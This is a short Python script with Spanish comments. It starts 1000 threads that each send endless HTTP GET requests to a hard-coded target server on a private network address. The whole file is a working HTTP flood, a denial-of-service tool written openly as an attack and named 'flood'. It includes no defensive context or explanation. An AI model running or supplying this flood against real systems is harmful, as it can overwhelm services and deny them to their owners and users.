import threading
import requests

# URL del servidor objetivo
target_url = "http://192.168.1.210:9000"

# Función para enviar solicitudes HTTP continuamente
def flood():
    while True:
        try:
            # Envía una solicitud GET al servidor
            requests.get(target_url)
            print(f"Solicitud enviada a {target_url}")
        except Exception as e:
            print(f"Error: {e}")

# Crear múltiples hilos para enviar solicitudes simultáneamente
num_threads = 1000  # Número de hilos para simular múltiples solicitudes
threads = []

for i in range(num_threads):
    thread = threading.Thread(target=flood)
    thread.daemon = True
    threads.append(thread)

# Iniciar todos los hilos
for thread in threads:
    thread.start()

# Mantener el programa en ejecución
for thread in threads:
    thread.join()